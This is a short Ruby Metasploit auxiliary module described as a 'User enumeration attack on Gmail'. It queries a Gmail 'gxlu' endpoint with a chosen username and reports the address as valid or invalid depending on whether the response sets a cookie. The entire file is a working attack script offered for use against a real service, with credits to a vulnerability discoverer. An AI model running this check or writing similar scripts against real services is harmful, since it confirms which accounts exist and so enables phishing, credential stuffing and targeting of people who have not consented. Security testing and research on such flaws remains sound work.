##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'net/http'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
 def initialize(info = {})
    super(update_info(info,
      'Name' => 'Enumeration users/gmails gmail',
      'Description' => %q{
       User enumeration attack on Gmail
       },
      'Author' =>
      [
       'x0rz', #Vulnerability Discovery
       'Mateus Lino <dctoralves[at]gmail.com>'
       ],
      'License' => MSF_LICENSE))
      register_options(
      [
        OptString.new('CHEK_GMAIL', [true, 'check emails valid by gmail']),
     ])
end
 def check_gmail(targetdom)
    clnt = URI("https://mail.google.com/mail/gxlu?email=#{targetdom}@gmail.com")
    resp = Net::HTTP.get_response(clnt)
    if(resp['Set-Cookie'])
    print_good("Valid email")
    else
    print_error("Invalid email")
    end
 end
  def run
    print_status("Checking email")
    target = datastore['CHEK_GMAIL']
    check_gmail(target) if datastore['CHEK_GMAIL']
   end
end
